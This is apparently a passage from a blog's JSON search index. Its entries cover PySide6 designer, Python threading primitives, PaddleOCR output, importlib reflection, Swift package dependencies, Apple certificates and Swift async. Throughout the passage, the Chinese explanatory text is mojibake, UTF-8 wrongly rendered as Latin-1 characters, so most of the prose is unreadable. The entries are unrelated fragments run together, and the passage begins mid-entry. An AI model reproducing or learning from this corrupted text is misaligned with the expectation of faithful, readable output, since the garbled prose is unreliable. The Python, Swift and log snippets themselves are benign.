QtWidget ä½¿ç”¨QtWidgetå¼€å‘ designer å›¾å½¢åŒ–å¼€å‘ å‘½ä»¤è¡Œæ‰§è¡Œ pyside6-designer å¯åŠ¨ åœ¨ Mac ä¸‹å¯åŠ¨å¦‚ä¸‹æ‰€ç¤º åç»­æ“ä½œè‡ªå·±æ¢ç´¢å§, è¿™ç•Œé¢æ²¡æœ‰ windows ç‰ˆç†Ÿæ‚‰, æš‚æ—¶ä¸æƒ³ç ”ç©¶ ç•Œé¢è®¾è®¡å®Œæˆåå¯ä»¥ä¿å­˜ä¸ºUIåç¼€æ–‡ä»¶, ä½¿ç”¨ pyside6-uic $file.ui >ui.py è½¬æ¢æˆpyæ–‡ä»¶æ‰å¯ä»¥ä½¿ç”¨ æ³¨è§£ ç”Ÿæˆçš„æ–‡ä»¶ç¼–ç ä¸æ˜¯utf-8 æ‰‹åŠ¨ç¼–ç  è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pyside6","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-GUI-development-QT.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-GUI-development-QT.html"},{"title":"å¤šçº¿ç¨‹","text":"çº¿ç¨‹æ˜¯è¿›ç¨‹çš„å­ä»»åŠ¡ï¼Œcpuè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œå®ç°è¿›ç¨‹å†…å¹¶å‘ã€‚ å¯åŠ¨ä¸€ä¸ªæ–°çº¿ç¨‹å¯ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/threading æ¨¡å— çº¿ç¨‹åŒæ­¥æŠ€æœ¯ï¼š è§£å†³å¤šä¸ªçº¿ç¨‹äº‰æŠ¢åŒä¸€ä¸ªèµ„æºçš„æƒ…å†µï¼Œçº¿ç¨‹åä½œå·¥ä½œã€‚ä¸€ä»½æ•°æ®åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹å¤„ç†ã€‚ è§£å†³çº¿ç¨‹åŒæ­¥çš„å‡ ç§æ–¹æ³•: Lockã€RLockã€Conditionã€Barrierã€semaphore çº¿ç¨‹é—´é€šä¿¡ äº’æ–¥é‡ : é€šè¿‡äº’æ–¥æœºåˆ¶é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…¬å…±èµ„æºã€‚ ä¿¡å·é‡ï¼ˆSemphareï¼‰: æ§åˆ¶åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªèµ„æºçš„çº¿ç¨‹æ•°ã€‚ ps: pythonçš„threading æ–‡æ¡£ äº‹ä»¶ï¼ˆä¿¡å·ï¼‰: é€šè¿‡é€šçŸ¥çš„æ–¹å¼ä¿æŒå¤šä¸ªçº¿ç¨‹çš„åŒæ­¥ã€‚ äº’æ–¥é‡ äº’æ–¥é”(mutex)/äº’æ–¥é‡ python Linuxä¸­æä¾›ä¸€æŠŠäº’æ–¥é”mutexï¼ˆä¹Ÿç§°ä¹‹ä¸ºäº’æ–¥é‡ï¼‰ ä½¿ç”¨, threadingæ¨¡å—ä¸­å®šä¹‰äº†Lockå˜é‡ï¼Œè¿™ä¸ªå˜é‡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé€šè¿‡è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–ä¸€æŠŠäº’æ–¥é”: # åˆ›å»ºé” mutex = threading.Lock() # ä¸Šé” mutex.acquire() # è¿™é‡Œç¼–å†™ä»£ç èƒ½ä¿è¯åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹å»æ“ä½œ, å¯¹å…±äº«æ•°æ®è¿›è¡Œé”å®š... # é‡Šæ”¾é” mutex.release() Pythoné‡äº’æ–¥é‡çš„å®ç°æœ‰ä»¥ä¸‹å‡ ç§å½¢å¼ threading.Condition() : Conditionå¯¹è±¡æä¾›äº†wait()ã€notify()å’Œnotify_all()ç­‰æ–¹æ³•ï¼Œå¯ä»¥ç”¨äºæ§åˆ¶å¤šä¸ªçº¿ç¨‹çš„æ‰§è¡Œã€‚åœ¨å¤šä¸ªçº¿ç¨‹å…±äº«ä¸€ä¸ªå˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Conditionå¯¹è±¡æ¥ç¡®ä¿å¤šä¸ªçº¿ç¨‹æŒ‰ç…§ç‰¹å®šçš„é¡ºåºè®¿é—®å…±äº«å˜é‡ã€‚ æ€»ä½“ä¸ŠåŒ…å«äº†ä¸€ä¸ªLockå¯¹è±¡å’Œä¸€ä¸ªwait setã€‚ è¯¥å¯¹è±¡ä¸»è¦æä¾›äº†ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ³•: wait():é‡Šæ”¾å†…éƒ¨é”å¹¶é˜»å¡çº¿ç¨‹,å°†çº¿ç¨‹åŠ å…¥åˆ°wait setä¸­ã€‚ notify():å”¤é†’ wait set ä¸­çš„ä¸€ä¸ªçº¿ç¨‹ã€‚ notify_all():å”¤é†’ wait set ä¸­çš„æ‰€æœ‰çº¿ç¨‹ã€‚ notify()å’Œnotify_all()çš„åŒºåˆ«åœ¨äº: notify()åªä¼šå”¤é†’wait setä¸­çš„ä¸€ä¸ªçº¿ç¨‹,å¹¶å°†å…¶ä»wait setä¸­ç§»é™¤ã€‚å…¶ä½™çº¿ç¨‹ä»ç„¶é˜»å¡ã€‚ notify_all()ä¼šå”¤é†’wait setä¸­çš„æ‰€æœ‰çº¿ç¨‹,å¹¶å°†å®ƒä»¬å…¨éƒ¨ä»wait setä¸­ç§»é™¤ã€‚ threading.Semaphore() : è®¡æ•°ä¿¡å·é‡, å®ƒå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…±äº«èµ„æºï¼Œä½†éœ€è¦é™åˆ¶åŒæ—¶è®¿é—®è¯¥èµ„æºçš„çº¿ç¨‹æ•°é‡ã€‚ Semaphoreå¯¹è±¡åŒ…å«ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªçº¿ç¨‹è®¿é—®å…±äº«èµ„æºæ—¶ï¼Œè¯¥è®¡æ•°å™¨å°±ä¼šå‡1ã€‚å½“è®¡æ•°å™¨ä¸º0æ—¶ï¼Œå…¶å®ƒçº¿ç¨‹å°†è¢«é˜»å¡ã€‚ threading.Event() : çº¿ç¨‹åŒæ­¥å·¥å…·ï¼Œç”¨äºçº¿ç¨‹é—´é€šä¿¡ã€‚å®ƒåŒ…å«ä¸€ä¸ªæ ‡å¿—ï¼Œå¯ä»¥é€šè¿‡set()å’Œclear()æ–¹æ³•è®¾ç½®æˆ–æ¸…é™¤ã€‚å½“ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨set()æ–¹æ³•æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥é€šè¿‡wait()æ–¹æ³•ç­‰å¾…è¯¥äº‹ä»¶å‘ç”Ÿã€‚ queue.Queue() : çº¿ç¨‹å®‰å…¨çš„å…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—, åº•å±‚è¿˜æ˜¯é”æœºåˆ¶","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Multithreading.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Multithreading.html"},{"title":"OCRè¯†åˆ«","text":"OCR (Optical Character Recognition), å…‰å­¦å­—ç¬¦è¯†åˆ« ç®€å•baiduäº†ä¸€ä¸‹, çœ‹åˆ°äº†ä¸€ç¯‡ å‡ ç§pythonå…¥é—¨çº§OCRå¼€æºåº“ä¸­æ–‡è¯†åˆ«æ•ˆæœå¯¹æ¯” ä½œè€…æ¨èä½¿ç”¨ PaddleOCR å®‰è£…: pip install paddlepaddle shapely paddleocr ä¾‹: æ¼”ç¤ºå›¾ç‰‡: ä»£ç : def ocr_with_paddle(img: str) -> list: from paddleocr import PaddleOCR, draw_ocr ocr_pad = PaddleOCR(use_angle_cls=True, lang=\"ch\") result = ocr_pad.ocr(img, cls=True) return result if __name__ == '__main__': _img = './img.png' r = ocr_with_paddle(_img) for x in r: for y in x: print(y) for x in r: for y in x: print(y[1][0]) ç»“æœ: [2023/03/16 11:34:21] ppocr DEBUG: Namespace(help='==SUPPRESS==', use_gpu=False, use_xpu=False, use_npu=False, ir_optim=True, use_tensorrt=False, min_subgraph_size=15, precision='fp32', gpu_mem=500, image_dir=None, page_num=0, det_algorithm='DB', det_model_dir='/Users/yanque/.paddleocr/whl/det/ch/ch_PP-OCRv3_det_infer', det_limit_side_len=960, det_limit_type='max', det_box_type='quad', det_db_thresh=0.3, det_db_box_thresh=0.6, det_db_unclip_ratio=1.5, max_batch_size=10, use_dilation=False, det_db_score_mode='fast', det_east_score_thresh=0.8, det_east_cover_thresh=0.1, det_east_nms_thresh=0.2, det_sast_score_thresh=0.5, det_sast_nms_thresh=0.2, det_pse_thresh=0, det_pse_box_thresh=0.85, det_pse_min_area=16, det_pse_scale=1, scales=[8, 16, 32], alpha=1.0, beta=1.0, fourier_degree=5, rec_algorithm='SVTR_LCNet', rec_model_dir='/Users/yanque/.paddleocr/whl/rec/ch/ch_PP-OCRv3_rec_infer', rec_image_inverse=True, rec_image_shape='3, 48, 320', rec_batch_num=6, max_text_length=25, rec_char_dict_path='/usr/local/lib/python3.9/site-packages/paddleocr/ppocr/utils/ppocr_keys_v1.txt', use_space_char=True, vis_font_path='./doc/fonts/simfang.ttf', drop_score=0.5, e2e_algorithm='PGNet', e2e_model_dir=None, e2e_limit_side_len=768, e2e_limit_type='max', e2e_pgnet_score_thresh=0.5, e2e_char_dict_path='./ppocr/utils/ic15_dict.txt', e2e_pgnet_valid_set='totaltext', e2e_pgnet_mode='fast', use_angle_cls=True, cls_model_dir='/Users/yanque/.paddleocr/whl/cls/ch_ppocr_mobile_v2.0_cls_infer', cls_image_shape='3, 48, 192', label_list=['0', '180'], cls_batch_num=6, cls_thresh=0.9, enable_mkldnn=False, cpu_threads=10, use_pdserving=False, warmup=False, sr_model_dir=None, sr_image_shape='3, 32, 128', sr_batch_num=1, draw_img_save_dir='./inference_results', save_crop_res=False, crop_res_save_dir='./output', use_mp=False, total_process_num=1, process_id=0, benchmark=False, save_log_path='./log_output/', show_log=True, use_onnx=False, output='./output', table_max_len=488, table_algorithm='TableAttn', table_model_dir=None, merge_no_span_structure=True, table_char_dict_path=None, layout_model_dir=None, layout_dict_path=None, layout_score_threshold=0.5, layout_nms_threshold=0.5, kie_algorithm='LayoutXLM', ser_model_dir=None, re_model_dir=None, use_visual_backbone=True, ser_dict_path='../train_data/XFUND/class_list_xfun.txt', ocr_order_method=None, mode='structure', image_orientation=False, layout=True, table=True, ocr=True, recovery=False, use_pdf2docx_api=False, lang='ch', det=True, rec=True, type='ocr', ocr_version='PP-OCRv3', structure_version='PP-StructureV2') [2023/03/16 11:34:22] ppocr DEBUG: dt_boxes num : 3, elapse : 0.06923604011535645 [2023/03/16 11:34:22] ppocr DEBUG: cls num : 3, elapse : 0.019355058670043945 [2023/03/16 11:34:24] ppocr DEBUG: rec_res num : 3, elapse : 1.6617558002471924 [[[12.0, 28.0], [254.0, 28.0], [254.0, 41.0], [12.0, 41.0]], ('æ—¶ï¼Œä¸€å®šè¦æ³¨æ„ä¸èƒ½åŒ…è£¹whileè¯­å¥', 0.8965110778808594)] [[[11.0, 109.0], [32.0, 109.0], [32.0, 126.0], [11.0, 126.0]], ('ä¾‹ï¼š', 0.9490082263946533)] æ—¶ï¼Œä¸€å®šè¦æ³¨æ„ä¸èƒ½åŒ…è£¹whileè¯­å¥ ä¾‹ï¼š æ³¨: ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶ä¼šä¸‹è½½ä¸€äº›åŒ…. æ¯”å¦‚æˆ‘çš„ä¸‹è½½åˆ°äº†ç”¨æˆ·ç›®å½•ä¸‹çš„ .paddleocr ä½ç½®: yanque@yanquedembp docker % ls -lh ~/.paddleocr/whl/* /Users/yanque/.paddleocr/whl/cls: total 0 drwxr-xr-x@ 5 yanque staff 160B 3 16 11:30 ch_ppocr_mobile_v2.0_cls_infer /Users/yanque/.paddleocr/whl/det: total 0 drwxr-xr-x@ 3 yanque staff 96B 3 16 11:30 ch /Users/yanque/.paddleocr/whl/rec: total 0 drwxr-xr-x@ 3 yanque staff 96B 3 16 11:30 ch","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-OCR-identification.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-OCR-identification.html"},{"title":"Pythonç½‘ç»œç¼–ç¨‹","text":"Socketåˆç§°\"å¥—æ¥å­—\"ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡\"å¥—æ¥å­—\"å‘ç½‘ç»œå‘å‡ºè¯·æ±‚æˆ–è€…åº”ç­”ç½‘ç»œè¯·æ±‚ï¼Œä½¿ä¸»æœºé—´æˆ–è€…è¿›ç¨‹é—´å¯ä»¥é€šè®¯ã€‚ Python æä¾›äº†ä¸¤ç§æœåŠ¡æ¨¡å—: socket åº•å±‚ç½‘ç»œæ¥å£, æä¾›äº†è®¿é—® BSD å¥—æ¥å­— çš„æ¥å£ socketserver ç½‘ç»œæœåŠ¡å™¨æ¡†æ¶, ç®€åŒ–ç½‘ç»œæœåŠ¡å™¨å¼€å‘","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Python-network-programming.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Python-network-programming.html"},{"title":"ä½¿ç”¨pythonä¸‹è½½æ–‡ä»¶","text":"æ–¹å¼ requests wget urllib awscli & boto3","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-python-to-download-files.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-python-to-download-files.html"},{"title":"Pythonåˆ©ç”¨åå°„å®ä¾‹å¯¹è±¡","text":"å¦‚æœä¸å±€é™äºä½¿ç”¨åå°„, å¯ä»¥è€ƒè™‘ä½¿ç”¨ eval å‡½æ•°, æ­¤å‡½æ•°ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å½“ä½œPythonä»£ç æ‰§è¡Œ. åå°„ åå°„(reflection)æ˜¯ä¸€ä¸ªç¼–ç¨‹è¯­è¨€çš„èƒ½åŠ›,å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥å’Œä¿®æ”¹å®ƒè‡ªå·±çš„ç»“æ„å’Œè¡Œä¸ºã€‚ å¦‚è®©ç¨‹åºåœ¨è¿è¡Œæ—¶å‘ç°å’Œä¿®æ”¹å®ƒè‡ªèº«çš„å±æ€§ã€æ–¹æ³•çš„ç»“æ„å’ŒåŠ¨æ€åœ°åˆ›å»ºå’Œæ‰§è¡Œã€‚ åå°„ä¸»è¦å…·æœ‰ä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½: è‡ªæˆ‘æ£€æŸ¥:ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶æ£€æŸ¥è‡ªèº«çš„ç»“æ„,è·å–ç±»ã€æ–¹æ³•ã€å±æ€§çš„ä¿¡æ¯ã€‚ è‡ªæˆ‘ä¿®æ”¹:ç¨‹åºåœ¨è¿è¡Œæ—¶å¯ä»¥ä¿®æ”¹è‡ªèº«çš„ç»“æ„,æ·»åŠ ã€åˆ é™¤æˆ–è€…ä¿®æ”¹ç±»ã€æ–¹æ³•ã€å±æ€§ã€‚ åŠ¨æ€åŠ è½½:å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ è½½å¤–éƒ¨ç±»å’Œç¼–è¯‘å¥½çš„ä»£ç ã€‚ é¿å…ç¡¬ç¼–ç :é€šè¿‡åå°„å¯ä»¥é¿å…å°†å­—ç¬¦ä¸²ã€ç±»åç­‰ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚ é€šå¸¸,åå°„ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢: æ¡†æ¶è®¾è®¡:é€šè¿‡åå°„å®ç°åŠ¨æ€åŠ è½½ç±»,é¿å…ç¡¬ç¼–ç ç±»å,å¢å¼ºçµæ´»æ€§ã€‚ åŠ¨æ€ä»£ç†:é€šå¸¸ä½¿ç”¨åå°„ç”Ÿæˆä»£ç†ç±»å’Œä»£ç†æ–¹æ³•ã€‚ ORMæ¡†æ¶:é€šè¿‡åå°„è¯»å–ç±»çš„å±æ€§ä¸æ•°æ®åº“å­—æ®µå¯¹åº”ã€‚ IoCå®¹å™¨:é€šè¿‡åå°„åŠ¨æ€å®ä¾‹åŒ–ç±»,å®ç°ä¾èµ–æ³¨å…¥ã€‚ åŠ¨æ€ç¼–è¯‘å™¨:é€šè¿‡åå°„ç”ŸæˆåŠ¨æ€ç±»å’Œæ–¹æ³•ã€‚ ä½¿ç”¨importlib è§: /docs/åç«¯/python/pythonæ ‡å‡†åº“/importlib å¦‚æœ‰ä¸€ä¸ªmodel.pyå†…å®¹å¦‚ä¸‹: class Person: def __init__(self, name): self.name = name åœ¨main.pyè°ƒç”¨: import importlib module = importlib.import_module('module') c = getattr(module, 'Person') p = c('Jack') print(p.name) # Jack","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html"},{"title":"Pythoné‡å†™çˆ¶ç±»æ–¹æ³•å‚æ•°åˆ—è¡¨é—®é¢˜","text":"ä»‹ç» ä½¿ç”¨ Pycharm æ—¶, å½“é‡å†™çˆ¶ç±»æ—¶, è‹¥å®šä¹‰äº†ä¸åŒçš„å‚æ•°åˆ—è¡¨, ä¼šå‡ºç°è­¦å‘Š. è¿™æ˜¯å› ä¸º: ç”±äºå¢åŠ äº†å‚æ•°ï¼Œä»è€Œæ”¹å˜äº†åŒçˆ¶ç±»æ–¹æ³•çš„ä¸€è‡´æ€§è¿åäº†LSPåŸåˆ™ï¼ˆåœ¨ä½¿ç”¨çˆ¶ç±»çš„åœºæ™¯ï¼Œæ›¿æ¢ä¸ºå­ç±»ä¹Ÿä¸€æ ·å¯è¡Œï¼‰ã€‚ è§£å†³æ–¹å¼ä¸ºï¼Œåœ¨å­ç±»é‡å†™çš„æ–¹æ³•ä¸­ä¸ºå‚æ•°é‡Œæ·»åŠ é»˜è®¤å€¼èµ‹å€¼ï¼Œè¿™æ ·å°±ç¡®ä¿äº†çˆ¶ç±»æ–¹æ³•ä¸­å®šä¹‰çš„å‚æ•°åœ¨å­ç±»ä¸­ä¸€å®šä¸ä¼šå¤±æ•ˆä»è€Œç¡®ä¿äº†è‡ªä¸Šè€Œä¸‹çš„ä¸€è‡´æ€§ã€‚ åªå¯æ–°å¢å‚æ•°, åŒæ—¶è®¾å®šé»˜è®¤å€¼ æºç ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html"},{"title":"å¢åŠ ä¾èµ–","text":"æ–¹æ¡ˆä¸€ - Xcode: é€‰æ‹©èœå•æ çš„ File > Add Package Dependency , ç„¶åè¾“å…¥ä»“åº“URL å‚è€ƒ: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app å¦‚æœæ²¡æ‰¾åˆ°çš„è¯(ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘å°±æ²¡æœ‰è¿™ä¸ªé¡¹), å°±å»é¡¹ç›®çš„ General , ä¸‹æ‹‰æ‰¾åˆ° Frameworks, Libraries, and Embedded Content , å¦‚å›¾: ç„¶åæ·»åŠ ä¾èµ–å³å¯ æ•ˆæœå°±æ˜¯åœ¨æ ¹ç›®å½•ä¸‹å¢åŠ ä¸€ä¸ª Package.resolved æ–‡ä»¶: { \"pins\" : [ { \"identity\" : \"keyboardshortcuts\", \"kind\" : \"remoteSourceControl\", \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\", \"state\" : { \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\", \"version\" : \"1.16.1\" } } ], \"version\" : 2 } æ–¹æ¡ˆäºŒ - å®˜æ–¹åŒ…(æ–‡ä»¶)ç®¡ç†å™¨: é¡¹ç›®æ ¹åˆ›å»º Package.swift å®šä¹‰ä¾èµ–é¡¹å’Œç‰ˆæœ¬ å†…å®¹ä¾‹(ä¸»è¦æ˜¯ä¸¤ä¸ª dependencies ä»¥åŠ å¤´éƒ¨çš„ç‰ˆæœ¬å®šä¹‰): // swift-tools-version: 5.8 // The swift-tools-version declares the minimum version of Swift required to build this package. import PackageDescription let package = Package( name: \"CQ\", dependencies: [ // æŒ‡å®š tag .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"), // æˆ–è€…æŒ‡å®š branch // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\") ], targets: [ // Targets are the basic building blocks of a package, defining a module or a test suite. // Targets can depend on other targets in this package and products from dependencies. .executableTarget( name: \"CQ\", dependencies: [ .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\") ], path: \"CQ\"), ] ) å®šä¹‰å¥½ä¹‹åæ‰§è¡Œ swift build å³å¯ æ³¨è§£ Xcodeç¼–è¾‘å™¨å¯èƒ½ä¼šæç¤º PackageDescription æ‰¾ä¸åˆ° çš„æŠ¥é”™, å¿½ç•¥å³å¯ åˆ›å»ºå‘å¸ƒå¯å‚è€ƒ: https://www.jianshu.com/p/44560fd214d2 éƒ¨åˆ†å±æ€§è¯´æ˜: name: ä¸€èˆ¬å°±æ˜¯äº§å“/é¡¹ç›®å dependencies: ä¾èµ–è·¯å¾„, æ”¯æŒå¤šç§è·¯å¾„ç±»å‹: git æº + ç¡®å®šçš„ç‰ˆæœ¬å· git æº + ç‰ˆæœ¬åŒºé—´ git æº + Commit å· git æº + åˆ†æ”¯å æœ¬åœ°è·¯å¾„ targets: ç›®æ ‡, å¯ä»¥æœ‰å¤šä¸ª targets.name: name targets.dependencies: ä¸ä¸Šé¢çš„ä¾èµ–ä¸ä¸€æ ·, å¯ä»¥ä¾èµ–ä¸Šé¢ Package.Dependency çš„ä¸œè¥¿æˆ–è€…ä¾èµ–å¦ä¸€ä¸ª targetã€‚ æ‰€ä»¥è¿™é‡Œåªéœ€è¦å†™ Package æˆ–è€… Target çš„åå­—å­—ç¬¦ä¸²ï¼ˆTarget.Dependency è¿™ä¸ªæšä¸¾ä¹Ÿå®ç°äº† ExpressibleByStringLiteralï¼‰ã€‚ targets.path: target çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º [PackageRoot]/Sources/[TargetName] targets.source: æºæ–‡ä»¶è·¯å¾„ï¼Œé»˜è®¤ TargetName æ–‡ä»¶å¤¹ä¸‹éƒ½æ˜¯æºä»£ç æ–‡ä»¶ï¼Œä¼šé€’å½’æœç´¢ targets.exclude: éœ€è¦è¢«æ’é™¤åœ¨å¤–çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼Œè¿™äº›æ–‡ä»¶ä¸ä¼šå‚ä¸ç¼–è¯‘ã€‚ targets.publicHeadersPath: C å®¶æ—åº“çš„å…¬å…±å¤´æ–‡ä»¶åœ°å€ã€‚ targets.swiftSettings: å®šä¹‰ä¸€ä¸ªç”¨äºç‰¹å®šç¯å¢ƒï¼ˆä¾‹å¦‚ Debugï¼‰çš„å®ï¼Œéœ€è¦è®¾ç½®çš„è¯å¯ä»¥å» API ä¸Šç ”ç©¶ä¸‹ targets.linkerSettings: ç”¨äºé“¾æ¥ä¸€äº›ç³»ç»Ÿåº“ è¿™ä¸ªæˆ‘å¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ æ–¹æ¡ˆä¸‰ - Podç®¡ç†å™¨: ç±»ä¼¼äºJavaçš„Maven","tags":"åç«¯; swift","url":"/yq-backend-swift-add-depy.html","loc":"/yq-backend-swift-add-depy.html"},{"title":"Appleè¯ä¹¦ç±»å‹","text":"å¼€å‘çš„è®¾å¤‡è¦åœ¨å…¶ä»–è®¾å¤‡ä¸Šè¿è¡Œ, éœ€è¦æœ‰è¯ä¹¦ å®è§‚æ¥è¯´æœ‰ä¸¤ç§ Appleå¼€å‘: æ™®é€šçš„å¸¦è¯ä¹¦çš„æœ¬åœ°å¼€å‘, ç›´æ¥ä½¿ç”¨è‡ªå·±è´¦æˆ·ç™»é™†, è¯ä¹¦é€‰æ‹©å¼€å‘è€…, å°±ä¼šé»˜è®¤ç”Ÿæˆä¸€ä¸ªå¯ç”¨çš„è¯ä¹¦(å…è´¹, æœ‰æ•ˆæœŸä¸€å¹´), è¿‡æœŸäº†å†é‡å¤å³å¯, Appleåˆ†å‘: ç”¨äºåœ¨å…¶ä»–è®¾å¤‡è¿è¡Œ, å‘å¸ƒåˆ°Apple Store, ä¸ªäººè´¦å·688/y å‚è€ƒ: Appleå®˜ç½‘-è¯ä¹¦ Appleå®˜ç½‘-è¯ä¹¦ç±»å‹","tags":"åç«¯; swift","url":"/yq-backend-swift-apple-cert-type.html","loc":"/yq-backend-swift-apple-cert-type.html"},{"title":"Swiftå¼‚æ­¥","text":"äºPythonç±»ä¼¼, é«˜ç‰ˆæœ¬ä¹Ÿæ”¯æŒä½¿ç”¨async(await)æ¥å®šä¹‰(è°ƒç”¨)å¼‚æ­¥å‡½æ•°: func fetchData() async -> String { // æ¨¡æ‹Ÿå¼‚æ­¥æ“ä½œï¼Œæ¯”å¦‚ä»ç½‘ç»œè·å–æ•°æ® await Task.sleep(1_000_000_000) // æ¨¡æ‹Ÿ1ç§’çš„å»¶è¿Ÿ return \"Data fetched successfully\" } å½“åœ¨å¼‚æ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨æ—¶, é™¤äº†ç›´æ¥await, è¿˜å¯ä»¥: async { print(\"Async code block\") let result = try await someAsyncFunction() print(\"Result: \\(result)\") } å¦‚æœè¦åœ¨åŒæ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨, å¯ä»¥ä½¿ç”¨ Task æˆ–è€… Task.runDetached : Task.runDetached { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } Task { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } ä¸¤è€…åŒºåˆ«åœ¨äºå®ƒä»¬çš„ä»»åŠ¡åˆ†ç¦»æ€§å’Œè¿è¡Œæ–¹å¼ ä»»åŠ¡åˆ†ç¦»æ€§ï¼š Task.runDetached: åˆ›å»ºä¸€ä¸ªåˆ†ç¦»çš„ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡ä¸ä¼šç­‰å¾…å…¶å®Œæˆï¼Œ å®ƒä¼šåœ¨åå°æ‰§è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚ è¿™æ„å‘³ç€ä¸»çº¿ç¨‹æˆ–å½“å‰ä¸Šä¸‹æ–‡ä¸­çš„ä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œè€Œä¸ç­‰å¾…ä»»åŠ¡å®Œæˆã€‚ Task: åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­åˆ›å»ºä¸€ä¸ªä»»åŠ¡ï¼Œå®ƒçš„è¡Œä¸ºç±»ä¼¼äºä¸€ä¸ªå­ä»»åŠ¡ã€‚ å¦‚æœä½ åœ¨ä¸€ä¸ªä»»åŠ¡ä¸­è°ƒç”¨å¦ä¸€ä¸ªä»»åŠ¡ï¼Œå¹¶ä½¿ç”¨ await æ¥ç­‰å¾…å®ƒçš„å®Œæˆï¼Œ é‚£ä¹ˆå®ƒä¼šåœ¨å½“å‰ä»»åŠ¡ä¸­è¢«ç­‰å¾…ï¼Œä¸ä¼šåˆ†ç¦»æ‰§è¡Œ è¿è¡Œæ–¹å¼ï¼š Task.runDetached: ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä»»åŠ¡ï¼Œå¹¶åœ¨åå°è¿è¡Œï¼Œä¸å½±å“å½“å‰ä»»åŠ¡çš„æ‰§è¡Œã€‚ è¿™é€šå¸¸ç”¨äºå¯åŠ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å®ƒå®Œæˆ Task: åœ¨å½“å‰ä»»åŠ¡ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¦‚æœä½¿ç”¨ await ç­‰å¾…å…¶å®Œæˆï¼Œ å®ƒä¼šè¢«ç­‰å¾…æ‰§è¡Œå®Œæˆåå†ç»§ç»­å½“å‰ä»»åŠ¡çš„æ‰§è¡Œ","tags":"åç«¯; swift","url":"/yq-backend-swift-course-async.html","loc":"/yq-backend-swift-course-async.html"},{"title":"å¸¸è§å±æ€§åŒ…è£…å™¨","text":"@State . @StateObject @StateObjectå±æ€§åŒ…è£…å™¨ä¸ç±»ä¼¼@Stateï¼Œåªä¸è¿‡å®ƒé€‚ç”¨äºObservableObjectã€‚ ä¸€ä¸ªObservableObjectå§‹ç»ˆæ˜¯å¼•ç”¨ç±»å‹ (class)ï¼Œå¹¶ä¸”æ¯å½“å…¶@Publishedå±æ€§ä¹‹ä¸€å‘ç”Ÿæ›´æ”¹æ—¶éƒ½ä¼šé€šçŸ¥ã€‚ @Binding . @ObservedObject 